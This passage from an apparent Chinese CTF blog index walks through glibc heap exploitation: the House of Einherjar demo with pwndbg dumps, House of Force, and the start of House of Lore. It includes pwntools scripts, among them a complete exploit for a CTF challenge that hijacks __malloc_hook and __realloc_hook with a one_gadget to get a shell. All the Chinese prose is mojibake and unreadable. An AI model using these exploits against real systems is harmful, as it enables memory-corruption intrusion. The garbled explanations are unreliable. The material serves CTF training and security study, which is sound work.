fake_size);\t*(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;\tfake_chunk[1] = fake_size;\tfree(b);\tprintf(&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n&quot;, fake_chunk[1]);\td = malloc(0x200);\tprintf(&quot;Next malloc(0x200) is at %p\\n&quot;, d);\tassert((long)d == (long)&amp;fake_chunk[2]);&#125;\nfrom GPT\nå˜é‡å£°æ˜ï¼šç¨‹åºå£°æ˜äº†ä¸‰ä¸ªæŒ‡å‘ uint8_t ç±»å‹çš„æŒ‡é’ˆå˜é‡ a, b, dï¼Œç”¨äºå­˜å‚¨å†…å­˜åœ°å€ã€‚a = (uint8_t*) malloc(0x38);ï¼šé€šè¿‡ malloc å‡½æ•°åˆ†é…äº† 0x38 å­—èŠ‚å¤§å°çš„å†…å­˜ï¼Œå¹¶å°†å…¶èµ·å§‹åœ°å€èµ‹ç»™å˜é‡ aã€‚è¾“å‡ºåœ°å€ï¼šä½¿ç”¨ printf è¯­å¥æ‰“å°å˜é‡ a çš„åœ°å€ã€‚int real_a_size = malloc_usable_size(a);ï¼šä½¿ç”¨ malloc_usable_size å‡½æ•°è·å–ç”± malloc åˆ†é…çš„å®é™…å¯ä½¿ç”¨çš„å†…å­˜å¤§å°ï¼Œå¹¶å°†ç»“æœä¿å­˜åœ¨å˜é‡ real_a_size ä¸­ã€‚æ‰“å°å®é™…å¤§å°ï¼šæ‰“å°å˜é‡ real_a_size çš„å€¼ã€‚å£°æ˜æ•°ç»„å˜é‡ï¼šå£°æ˜äº†ä¸€ä¸ªåä¸º fake_chunk çš„å¤§å°ä¸º 6 çš„ size_t ç±»å‹çš„æ•°ç»„ã€‚åˆå§‹åŒ–æ•°ç»„ï¼šç»™æ•°ç»„å…ƒç´ èµ‹å€¼ã€‚è¿™ä¸ªæ•°ç»„ç”¨äºæ„é€ ä¸€ä¸ªå‡çš„å †å—ç»“æ„ã€‚è¾“å‡ºæ•°ç»„å†…å®¹ï¼šä½¿ç”¨ printf æ‰“å°æ•°ç»„ fake_chunk ä¸­çš„å†…å®¹ã€‚b = (uint8_t*) malloc(0x4f8);ï¼šé€šè¿‡ malloc å‡½æ•°åˆ†é…äº† 0x4f8 å­—èŠ‚å¤§å°çš„å†…å­˜ï¼Œå¹¶å°†å…¶èµ·å§‹åœ°å€èµ‹ç»™å˜é‡ bã€‚è·å–å®é™…å¤§å°ï¼šä½¿ç”¨ malloc_usable_size å‡½æ•°è·å–ç”± malloc åˆ†é…çš„å®é™…å¯ä½¿ç”¨çš„å†…å­˜å¤§å°ï¼Œå¹¶å°†ç»“æœä¿å­˜åœ¨å˜é‡ real_b_size ä¸­ã€‚è¾“å‡ºåœ°å€ï¼šæ‰“å°å˜é‡ b çš„åœ°å€ã€‚uint64_t* b_size_ptr = (uint64_t*)(b - 8);ï¼šå£°æ˜ä¸€ä¸ªæŒ‡å‘ uint64_t ç±»å‹çš„æŒ‡é’ˆå˜é‡ b_size_ptrï¼Œå¹¶å°†å…¶æŒ‡å‘å˜é‡ b å‰é¢ 8 ä¸ªå­—èŠ‚ã€‚è¾“å‡º b.sizeï¼šæ‰“å°å˜é‡ b_size_ptr çš„å€¼ï¼Œå³å˜é‡ b å‰é¢ 8 ä¸ªå­—èŠ‚ä¸­ä¿å­˜çš„æ•°å€¼ã€‚å†…å­˜æº¢å‡ºï¼šé€šè¿‡å†™å…¥ a[real_a_size] = 0;ï¼Œåœ¨å˜é‡ a çš„æœ«å°¾å†™å…¥ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œå¯èƒ½å¯¼è‡´æº¢å‡ºã€‚è¾“å‡º b.sizeï¼šå†æ¬¡æ‰“å°å˜é‡ b_size_ptr çš„å€¼ï¼ŒæŸ¥çœ‹æ˜¯å¦å—åˆ°å†…å­˜æº¢å‡ºçš„å½±å“ã€‚è®¡ç®—å‡çš„ prev_sizeï¼šé€šè¿‡è®¡ç®—ä¸¤ä¸ªå†…å­˜åœ°å€ä¹‹é—´çš„åç§»é‡æ¥è®¡ç®—å‡çš„ prev_size å€¼ã€‚å†™å…¥å‡çš„ prev_sizeï¼šå°†è®¡ç®—å¾—åˆ°çš„å‡çš„ prev_size å€¼å†™å…¥ a çš„æœ«å°¾ï¼Œä»¥æ¨¡æ‹Ÿä¸€ä¸ªè¢«æº¢å‡ºä¿®æ”¹çš„å †å—ã€‚æ›´æ–° fake_chunk[1]ï¼šæ›´æ–°æ•°ç»„ fake_chunk çš„ç¬¬äºŒä¸ªå…ƒç´ ï¼Œä½¿å…¶ä¸å‡çš„ prev_size å€¼ä¿æŒä¸€è‡´ã€‚é‡Šæ”¾ bï¼šä½¿ç”¨ free å‡½æ•°é‡Šæ”¾å˜é‡ b æ‰€æŒ‡å‘çš„å†…å­˜å—ã€‚è¾“å‡º fake chunk å¤§å°ï¼šæ‰“å°æ›´æ–°åçš„å‡çš„å †å—å¤§å°ã€‚d = malloc(0x200);ï¼šé€šè¿‡ malloc å‡½æ•°åˆ†é…äº† 0x200 å­—èŠ‚å¤§å°çš„å†…å­˜ï¼Œå¹¶å°†å…¶èµ·å§‹åœ°å€èµ‹ç»™å˜é‡ dã€‚è¾“å‡ºä¸‹ä¸€ä¸ªåˆ†é…çš„åœ°å€ï¼šæ‰“å°å˜é‡ d çš„åœ°å€ã€‚ä½¿ç”¨ assert å‡½æ•°è¿›è¡Œæ–­è¨€åˆ¤æ–­ï¼šåˆ¤æ–­å˜é‡ d æ˜¯å¦ç­‰äº &amp;fake_chunk[2]ã€‚\nç¨‹åºå…ˆåˆ›å»ºäº†ä»¥ä¸‹ä¸¤ä¸ªå †å—å’Œä¸­é—´ä¸€ä¸ªâ€œå †å—â€chunka\npwndbg&gt; x/8gx 0x5555557572500x555555757250:\t0x0000000000000000\t0x00000000000000410x555555757260:\t0x0000000000000000\t0x00000000000000000x555555757270:\t0x0000000000000000\t0x00000000000000000x555555757280:\t0x0000000000000000\t0x0000000000000000\nfake_chunk\npwndbg&gt; x/10gx 0x7fffffffe2c00x7fffffffe2c0:\t0x0000000000000100\t0x00000000000001000x7fffffffe2d0:\t0x00007fffffffe2c0\t0x00007fffffffe2c00x7fffffffe2e0:\t0x00007fffffffe2c0\t0x00007fffffffe2c00x7fffffffe2f0:\t0x00007fffffffe3e0\t0x574290d927ca7a000x7fffffffe300:\t0x0000555555554ae0\t0x00007ffff7a03c87\nchunkb\npwndbg&gt; x/10gx 0x5555557572900x555555757290:\t0x0000000000000000\t0x00000000000005010x5555557572a0:\t0x0000000000000000\t0x00000000000000000x5555557572b0:\t0x0000000000000000\t0x00000000000000000x5555557572c0:\t0x0000000000000000\t0x00000000000000000x5555557572d0:\t0x0000000000000000\t0x0000000000000000\næ‰§è¡Œ\nuint64_t* b_size_ptr = (uint64_t*)(b - 8);\nè¿™é‡Œå…¶å®å°±æ˜¯å°†chunk_bçš„mallocæŒ‡é’ˆ-0x8çš„ä½ç½®ï¼Œå³chunk_bçš„sizeå€¼æ”¾åœ¨äº†b_size_ptrå˜é‡ä¸­ã€‚\npwndbg&gt; p b_size_ptr$1 = (uint64_t *) 0x555555757298pwndbg&gt; x/2gx 0x5555557572980x555555757298:\t0x0000000000000501\t0x0000000000000000\nå†æ‰§è¡Œ\na[real_a_size] = 0;\nè¿™é‡Œæ¨¡æ‹Ÿçš„å°±æ˜¯off-by-oneçš„è¿‡ç¨‹ã€‚é‚£ä¹ˆè¿™æ ·ä¸€æ¥chunk_bçš„inuseæ ‡å¿—ä½å°±è¢«è¦†ç›–æˆäº†0\nçœ‹ä¸€ä¸‹ä¸¤ä¸ªchunkæ³¨æ„chunkbçš„å˜åŒ–\npwndbg&gt; x/20gx 0x5555557572500x555555757250:\t0x0000000000000000\t0x00000000000000410x555555757260:\t0x0000000000000000\t0x00000000000000000x555555757270:\t0x0000000000000000\t0x00000000000000000x555555757280:\t0x0000000000000000\t0x00000000000000000x555555757290:\t0x0000000000000000\t0x0000000000000500**0x5555557572a0:\t0x0000000000000000\t0x00000000000000000x5555557572b0:\t0x0000000000000000\t0x00000000000000000x5555557572c0:\t0x0000000000000000\t0x00000000000000000x5555557572d0:\t0x0000000000000000\t0x00000000000000000x5555557572e0:\t0x0000000000000000\t0x0000000000000000\næ‰§è¡Œåˆ°\nsize_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);\n\npwndbg&gt; p/x fake_size$2 = 0xffffd55555758fd0\n\nfake_sizeæ˜¯ç”±b-sizeof(size_t)2å’Œ(uint8_t)fake_chunkç›¸å‡å¾—åˆ°çš„ï¼š\nb-sizeof(size_t)2ï¼šchunk_bçš„mallocæŒ‡é’ˆå‡å»ä¸¤ä¸ªåœ°å€ä½å®½ï¼Œä¹Ÿå°±æ˜¯chunk_bçš„å¤´æŒ‡é’ˆ(uint8_t)fake_chunkï¼šå³æ˜¯ä¼ªé€ å †å—çš„å¤´æŒ‡é’ˆé‚£ä¹ˆè¿™æ ·ä¸€æ¥å°±å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºfake_sizeï¼Œå³æ˜¯chunk_bå¤´æŒ‡é’ˆè·ç¦»fake_chunkå¤´æŒ‡é’ˆçš„åç§»ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬çœ‹åˆ°çš„åç§»ä¸º0xffffd55555758fd0è¿™ä»£è¡¨ç€åç§»å…¶å®æ˜¯ä¸€ä¸ªè´Ÿæ•°\næ‰§è¡Œ\n*(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;fake_chunk[1] = fake_size;\n\nçœ‹chunkbå’Œfakechunk\npwndbg&gt; x/10gx 0x555555757290 //chunkb0x555555757290:\t0xffffd55555758fd0\t0x00000000000005000x5555557572a0:\t0x0000000000000000\t0x00000000000000000x5555557572b0:\t0x0000000000000000\t0x00000000000000000x5555557572c0:\t0x0000000000000000\t0x00000000000000000x5555557572d0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; x/10gx 0x7fffffffe2c0 //fakechunk0x7fffffffe2c0:\t0x0000000000000100\t0xffffd55555758fd00x7fffffffe2d0:\t0x00007fffffffe2c0\t0x00007fffffffe2c00x7fffffffe2e0:\t0x00007fffffffe2c0\t0x00007fffffffe2c00x7fffffffe2f0:\t0x00007fffffffe3e0\t0x574290d927ca7a000x7fffffffe300:\t0x0000555555554ae0\t0x00007ffff7a03c87\nchunk_bçš„prev_sizeç­‰äºfake_chunkçš„sizeï¼Œè¿™ä¸ªsizeæ°å·§åˆæ˜¯chunk_båˆ°fake_chunkçš„åç§»ï¼Œæ›´å·§çš„æ˜¯chunk_bçš„inuseæ ‡å¿—ä½ä¸º0\né‚£ä¹ˆå¦‚æœæˆ‘ä»¬free(b)ï¼Œosé¦–å…ˆä¼šå»æ£€æŸ¥å…¶inuseæ ‡å¿—ä½ï¼Œå‘ç°ä¸º0ï¼Œè¿™å°±æ„å‘³ç€å­˜åœ¨ä¸€ä¸ªç›¸é‚»åœ°å€çš„å †å—ä¹Ÿæ˜¯å¤„äºé‡Šæ”¾çŠ¶æ€çš„é‚£ä¹ˆå°±ä¼šæ ¹æ®chunk_bçš„prev_sizeå…ˆå‰æ‰¾æ˜¯å¦å­˜åœ¨ä¸€ä¸ªå¤§å°ä¸º0xffffd55555779d41å¤§å°çš„å †å—ç»“æœæ ¹æ®chunk_bçš„å¤´æŒ‡é’ˆ+0xffffd55555779d41å¤„æ‰¾åˆ°äº†fake_chunkfake_chunkçš„sizeæ­£æ˜¯æˆ‘ä»¬è®¾ç½®çš„0xffffd55555779d41æ ¹æ®freeå‡½æ•°åå‘åˆå¹¶æœºåˆ¶ï¼Œç”±äºæˆ‘ä»¬ä¼ªé€ äº†fake_chunkçš„fdã€bkã€fd_nextsizeã€bk_nextsizeï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡unlinkæ£€æŸ¥é‚£ä¹ˆchunkbä¸fakechunkå°±è¢«åˆå¹¶ç§°ä¸ºä¸€ä¸ªå¤§å°ä¸ºfake_size + b_sizeçš„å¤§å †å—å¹¶ä¸”åˆå¹¶å¤§å †å—çš„å¤´æŒ‡é’ˆå³æ˜¯fake_chunkçš„å¤´æŒ‡é’ˆ0x7fffffffe2d0\nä¸”ï¼Œæ ¹æ®top_chunkåˆå¹¶æœºåˆ¶ï¼Œç”±äºchunk_bæ˜¯ç´§é‚»top_chunkçš„ï¼Œé‚£ä¹ˆåœ¨chunk_bä¸fake_chunkåˆå¹¶ä¹‹åtop_chunkä¼šæ”¶ä¸‹åˆå¹¶åçš„æ•´ä¸ªå¤§å †å—æ–°çš„top_chunkçš„sizeå˜æˆäº†old_topchunk_size + fake_chunk_size + chunkb_sizeã€‚å¹¶ä¸”top_chunkçš„å¤´æŒ‡é’ˆä¼šå˜æˆåˆå¹¶å †å—çš„å¤´æŒ‡é’ˆï¼Œå³fake_chunkçš„å¤´æŒ‡é’ˆ0xffffd55555779d41\næ¥ä¸‹æ¥æˆ‘ä»¬æ‰§è¡Œfree(b)å’Œmalloc(0x200)è¿™ä¸¤æ­¥æ“ä½œfree(b)ä¼šå®Œæˆä¸Šè¿°çš„æ‰§è¡Œè¿‡ç¨‹è€Œå› ä¸ºbinä¸­æ²¡æœ‰èƒ½å¤Ÿæ»¡è¶³malloc(0x200)çš„ç©ºé—²å—ï¼Œæ‰€ä»¥ä¼šå‘top_chunkç”³è¯·ä¸€ä¸ªsizeä¸º0x200å¤§å°çš„å †å—ç”±äºæ­¤æ—¶top_chunkçš„å¤´æŒ‡é’ˆæ˜¯fake_chunk(0x7fffffffe2d0)æ‰€ä»¥æœ€åè¢«å¯ç”¨çš„å †å—å³æ˜¯ä»¥fake_chunkä¸ºå¤´æŒ‡é’ˆ0x7fffffffe2d0ï¼Œsizeä¸º0x210å¤§å°çš„å †å—\nè¿™æ ·æˆ‘ä»¬ä¼ªé€ çš„fakechunkå°±ä¼šè¢«ä»¥æ­£å¸¸å †å—çš„å½¢å¼è¢«mallocå‡ºæ¥äº†\npwndbg&gt; cContinuing.Our fake chunk size is now 0xffffd55555779d41 (b.size + fake_prev_size)Next malloc(0x200) is at 0x7fffffffe2d0[Inferior 1 (process 4452) exited normally]\n\nåƒå°æ—¶å€™ç©çš„ç¥–ç›\næ”¾ä¸ªå®Œæ•´çš„è¿è¡Œä¿¡æ¯ç¨‹åºä¸ºhow2heapæºç¨‹åºhouse_of_einherjar\nroot@ubuntu:/home/str1k3/Desktop# ./a.outWelcome to House of Einherjar!Tested in Ubuntu 18.04.4 64bit.This technique only works with disabled tcache-option for glibc or with size of b larger than 0x408, see build_glibc.sh for build instructions.This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.We allocate 0x38 bytes for &#x27;a&#x27;a: 0x5625ee49e260Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: 0x38We create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stackHowever, you can also create the chunk in the heap or the bss, as long as you know its addressWe set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks(although we could do the unsafe unlink technique here in some scenarios)Our fake chunk at 0x7ffe1bda3090 looks like:prev_size (not used): 0x100size: 0x100fwd: 0x7ffe1bda3090bck: 0x7ffe1bda3090fwd_nextsize: 0x7ffe1bda3090bck_nextsize: 0x7ffe1bda3090We allocate 0x4f8 bytes for &#x27;b&#x27;.b: 0x5625ee49e2a0b.size: 0x501b.size is: (0x500) | prev_inuse = 0x501We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;b.size: 0x500This is easiest if b.size is a multiple of 0x100 so you don&#x27;t change the size of b, only its prev_inuse bitIf it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunkWe write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunkOur fake prev_size will be 0x5625ee49e290 - 0x7ffe1bda3090 = 0xffffd627d26fb200Modify fake chunk&#x27;s size to reflect b&#x27;s new prev_sizeNow we free b and this will consolidate with our fake chunk since b prev_inuse is not setOur fake chunk size is now 0xffffd627d271bf71 (b.size + fake_prev_size)Now we can call malloc() and it will begin in our fake chunkNext malloc(0x200) is at 0x7ffe1bda30a0\næ¥è‡ªhollkå¸ˆå‚…çš„æ€»ç»“åˆ©ç”¨è¯¥æ–¹æ³•éœ€è¦æ³¨æ„çš„ä¸‰ç‚¹\n1.éœ€è¦æœ‰æº¢å‡ºæ¼æ´å¯ä»¥å†™ç‰©ç†ç›¸é‚»çš„é«˜åœ°å€çš„ prev_size ä¸ PREV_INUSE éƒ¨åˆ†2.éœ€è¦è®¡ç®—ç›®çš„ fake_chunk ä¸ chunk_b åœ°å€ä¹‹é—´çš„å·®ï¼Œæ‰€ä»¥éœ€è¦æ³„æ¼åœ°å€3.éœ€è¦åœ¨ç›®çš„ chunk é™„è¿‘æ„é€ ç›¸åº”çš„ fake chunkï¼Œä»è€Œç»•è¿‡ unlink çš„æ£€æµ‹\nå‰é¢çš„ä¾‹é¢˜ï¼Œä»¥åå†æ¥æ¢ç´¢å§\n","categories":["heap"],"tags":["bin"]},{"title":"house_of_force","url":"/2023/09/02/house-of-force/","content":"house_of_forcehouse of forceçš„æ”»å‡»åŸç†æ˜¯å°è¯•ä»heapä¸­åˆ†é…ä¸€ä¸ªéå¸¸å¤§çš„å†…å­˜ï¼Œä½¿å¾—å¯ä»¥å°†chunkåˆ†é…åœ¨é«˜åœ°å€çš„libcä¸­æˆ–è€…è¿›ä¸€æ­¥è®©å…¶æº¢å‡ºåˆ†é…åˆ°ä½åœ°å€ä¸Šçš„ç”¨æˆ·ä»£ç æ®µä¸­ã€‚\nç”¨æˆ·ç”³è¯·ä¸€ä¸ªchunkåç³»ç»Ÿå…ˆåˆ¤æ–­binä¸­æ˜¯å¦æœ‰ç¬¦åˆå¤§å°çš„chunk å¦‚æœæ²¡æœ‰å†å»top chunkåˆ†é…\ntop chunkçš„åˆ†é…åŠæ³•æ˜¯åœ¨top chunké¡¶éƒ¨åˆ†é…å‡ºä¸€ä¸ªç©ºé—´ éšåtop chunkçš„ä½ç½®å‘é«˜åœ°å€å¤„å¢åŠ å…ˆçœ‹çœ‹chunkç”³è¯·çš„æºç \nvictim = av-&gt;top;//è·å–å½“å‰top chunkçš„åœ°å€size = chunksize (victim);//è·å–å½“å‰top chunkçš„å¤§å°if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))//MINSIZEå°±æ˜¯å †å—çš„æœ€å°sizeï¼Œ32ä½ç¨‹åºä¸º0x10ï¼Œ64ä½ç¨‹åºä¸º0x20//nbä¸ºå®é™…è¦è·å–çš„chunkå¤§å°(ç”³è¯·çš„å¤§å°åŠ ä¸ŠMINSIZE)//åˆ¤æ–­å¼æ˜¯ä¸ºäº†ä¿è¯top chunkæœ‰è¶³å¤Ÿå¤§å°çš„ç©ºé—´æ¥ä¾›æ­¤æ¬¡ç”³è¯·//ä¹‹æ‰€ä»¥è¦åŠ ä¸ŠMINSIZEæ˜¯å› ä¸ºä¸ºäº†ç¡®ä¿ç”³è¯·å®Œchunkå top chunkè¿˜èƒ½ä¿æŒå®Œæ•´çš„chunkç»“æ„  &#123;    remainder_size = size - nb;              //remainder_sizeä¸ºåˆ†é…chunkåçš„top chunkå¤§å°    remainder = chunk_at_offset (victim, nb);//remainderä¸ºåˆ†é…å®Œåçš„top chunkåœ°å€    av-&gt;top = remainder;                     //æ›´æ–°top chunk                                             //ä¸‹é¢ä¸¤ä¸ªset_headç»™åˆ†é…å‡ºå»çš„å †å—ä»¥åŠåˆ†é…åçš„top chunkè®¾ç½®æ–°çš„size    set_head (victim, nb | PREV_INUSE |              (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head (remainder, remainder_size | PREV_INUSE);    check_malloced_chunk (av, victim, nb);    void *p = chunk2mem (victim);    alloc_perturb (p, bytes);    return p;  &#125;\nè¦å®ç°house of forceæ”»å‡»ï¼Œæˆ‘ä»¬éœ€è¦ä¸¤ç‚¹ï¼Œä¸€æ˜¯ä¿®æ”¹Top chunk sizeä¸ºéå¸¸å¤§çš„æ•°ï¼Œæ–¹ä¾¿æˆ‘ä»¬å¯ä»¥è¿›è¡Œä»»æ„å¤§çš„å†…å­˜åˆ†é…ï¼›äºŒæ˜¯åˆ†é…å¤§å†…å­˜åï¼ŒTop chunkå‰©ä½™sizeå¿…é¡»å¤§äºï¼šXï¼ˆæˆ‘ä»¬æƒ³è¦åœ¨ç›®æ ‡åœ°å€åˆ†é…çš„chunkå¤§å°ï¼ŒåŒ…æ‹¬å¤´éƒ¨ä¿¡æ¯ï¼‰+ MINSIZE(å¤§å°ä¸º0x20)ï¼Œè¿™æ ·æ‰èƒ½è®©æˆ‘ä»¬åœ¨ç›®æ ‡åœ°å€å¤„è¿›ä¸€æ­¥åˆ†é…Xå¤§å°çš„chunkã€‚\nfrom pwn import*p = process(&quot;./2heap&quot;)elf = ELF(&quot;./2heap&quot;)#libc = ELF(&quot;./libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def add(size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;You can customize the size of house here, but what about your life&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;add something to your house\\n&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;every decision you made is meaningful&#x27;)    p.sendline(str(index))def edit(index,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;It&#x27;s never too late to make changes&quot;)    p.sendline(str(index))    p.recvuntil(b&quot;something interesting here&quot;)    p.sendline(str(size))    p.sendlineafter(b&quot;Now add something&quot;,payload)def show(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))add(0x20,b&#x27;0xcafe66&#x27;)#chunk0add(0x30,b&#x27;aaaa&#x27;)#chunk1payload = cyclic(0x38)+p64(0xffffffffffffffff)debug()edit(1,len(payload),payload)#attackpause()add(0x40,b&#x27;aaaa&#x27;)#chunk3\næ”»åªå› å‰\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x1bc1000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x1bc1290Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x1bc12c0Size: 0x41Top chunk | PREV_INUSEAddr: 0x1bc1300Size: 0x20d01\næ”»åªå› å\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x1bc1000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x1bc1290Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x1bc12c0Size: 0x41Top chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENAAddr: 0x1bc1300Size: 0xffffffffffffffffpwndbg&gt; x/40gx 0x1bc13000x1bc1300:\t0x6161616e6161616d\t0xffffffffffffffff0x1bc1310:\t0x000000000000000a\t0x00000000000000000x1bc1320:\t0x0000000000000000\t0x00000000000000000x1bc1330:\t0x0000000000000000\t0x00000000000000000x1bc1340:\t0x0000000000000000\t0x00000000000000000x1bc1350:\t0x0000000000000000\t0x00000000000000000x1bc1360:\t0x0000000000000000\t0x00000000000000000x1bc1370:\t0x0000000000000000\t0x00000000000000000x1bc1380:\t0x0000000000000000\t0x00000000000000000x1bc1390:\t0x0000000000000000\t0x00000000000000000x1bc13a0:\t0x0000000000000000\t0x00000000000000000x1bc13b0:\t0x0000000000000000\t0x00000000000000000x1bc13c0:\t0x0000000000000000\t0x00000000000000000x1bc13d0:\t0x0000000000000000\t0x00000000000000000x1bc13e0:\t0x0000000000000000\t0x00000000000000000x1bc13f0:\t0x0000000000000000\t0x00000000000000000x1bc1400:\t0x0000000000000000\t0x00000000000000000x1bc1410:\t0x0000000000000000\t0x00000000000000000x1bc1420:\t0x0000000000000000\t0x00000000000000000x1bc1430:\t0x0000000000000000\t0x0000000000000000\nå¯ä»¥çœ‹åˆ°è¿™ä¸ªtopchunkçš„sizeå·²è¢«ç¯¡æ”¹\nä¸‹é¢æ”¾é“é¢˜ï¼Œçœ‹çœ‹è¯¥æŠ€æœ¯å¦‚ä½•åˆ©ç”¨gyctf_2020_forcechecksec\n[*] &#x27;/var/run/vmblock-fuse/blockdir/Zf5bfF/force&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\nçœ‹çœ‹addå‡½æ•°\nunsigned __int64 sub_A20()&#123;  const void **i; // [rsp+0h] [rbp-120h]  __int64 size; // [rsp+8h] [rbp-118h]  char s[256]; // [rsp+10h] [rbp-110h] BYREF  unsigned __int64 v4; // [rsp+118h] [rbp-8h]  v4 = __readfsqword(0x28u);  memset(s, 255, sizeof(s));  for ( i = (const void **)&amp;unk_202080; *i; ++i )    ;  if ( (char *)i - (char *)&amp;unk_202080 &gt; 39 )    exit(0);  puts(&quot;size&quot;);  read(0, nptr, 0xFuLL);  size = atol(nptr);  *i = malloc(size);   //æ²¡æœ‰é™åˆ¶chunk_size  if ( !*i )    exit(0);  printf(&quot;bin addr %p\\n&quot;, *i);//ä¼šæ‰“å°å †åœ°å€  puts(&quot;content&quot;);  read(0, (void *)*i, 0x50uLL);//å­˜åœ¨å †æº¢å‡ºï¼Œå½“ç”³è¯·çš„chunk_size &lt; 0x50æ—¶  puts(&quot;done&quot;);  return __readfsqword(0x28u) ^ v4;&#125;\none_gadgets\n0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL\nå…ˆæ‰“house_of_forceï¼Œæ‹¿ætop_chunkåŒæ—¶ï¼Œåœ¨åˆ†é…ç¬¬ä¸€ä¸ªchunkæ—¶ï¼Œç¨‹åºè¿˜ä¼šæ‰“å°å‡ºbin_addr,å¯ä»¥åˆ©ç”¨æ­¤æ³„éœ²libc_addr\n__realloc_hook å’Œ __malloc_hookè¿™ä¸¤ä¸ªé’©å­å‡½æ•°æ˜¯ç›¸é‚»çš„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åŒä¸€ä¸ªchunkæ¥åŠ«æŒ__malloc_hookä¸ºrealloc+0x10ï¼Œå¹¶åŠ«æŒ__realloc_hookä¸ºone_gadget\nå†æ¬¡æ‰§è¡Œmallocå³å¯getshell\nfrom pwn import *#p = process(&#x27;./force&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,27065)libc = ELF(&quot;buu_libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size, content):    p.recvuntil(&quot;2:puts\\n&quot;)    p.sendline(&quot;1&quot;)    p.recvuntil(&quot;size\\n&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;bin addr &quot;)    info = p.recvuntil(&quot;\\n&quot;, drop=True)    # print(info)    info = int(info.decode(&quot;ISO-8859-1&quot;), 16)    p.recvuntil(&quot;content\\n&quot;)    p.send(content)    return infoone_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]libc.address = add(0x200000, &#x27;chunk0\\n&#x27;) + 0x200ff0 #gdbæ‰¾åç§»ï¼Œleak_libc_base &amp;&amp; house_of_forceæ‹¿ætopchunksuccess(&#x27;libc_base&#x27;+hex(libc.address))heap_addr = add(0x18,b&#x27;a&#x27;*0x10+p64(0)+p64(0xFFFFFFFFFFFFFFFF)) #leak_heap_addr &amp;&amp;ä¿®æ”¹topchunkçš„sizeä¸º0xFFFFFFFFFFFFFFFFsuccess(&quot;heap_addr:&quot;+hex(heap_addr))top = heap_addr + 0x10          #leak_topchunk_addrmalloc_hook = libc.sym[&#x27;__malloc_hook&#x27;] #get_malloc_hook_addrsuccess(&quot;malloc_hook:&quot;+hex(malloc_hook))realloc = libc.sym[&quot;__libc_realloc&quot;]offset = malloc_hook - topsystem = libc.sym[&#x27;system&#x27;]bin_sh = libc.search(b&#x27;/bin/sh&#x27;)success(&quot;system:&quot; + hex(system))success(&quot;bin_sh:&quot; + str(bin_sh))#debug()#one_gadget + libc.address -&gt; è®¡ç®—åç§»,ä½¿topchunkè½åœ¨malloc_hookå¤„#æ­¤æ—¶ç”³è¯·ä¸€ä¸ªchunkï¼Œå°±å¯ä»¥å®ç°ä¿®æ”¹malloc_hookå’Œrealloc_hookadd(offset-0x30,b&#x27;aaa\\n&#x27;)add(0x30,b&#x27;a&#x27;*8+p64(one_gadget[1] + libc.address)+p64(realloc+0x10))#hijack_malloc_hook#å†æ¬¡æ‰§è¡Œmallocï¼Œå³å¯getshellp.recvuntil(&quot;2:puts\\n&quot;)p.sendline(&#x27;1&#x27;)p.recvuntil(&quot;size\\n&quot;)p.sendline(str(20))p.interactive()\n\n","categories":["heap"],"tags":["bin"]},{"title":"house_of_lore","url":"/2023/11/03/house-of-lore/","content":"unsorted bin + small binè¿˜æœ‰largebinç‰ˆæœ¬çš„åˆ©ç”¨æ¯”è¾ƒç±»ä¼¼\nè´´ä¸€æ³¢smallbinçš„æºç \n/*       If a small request, check regular 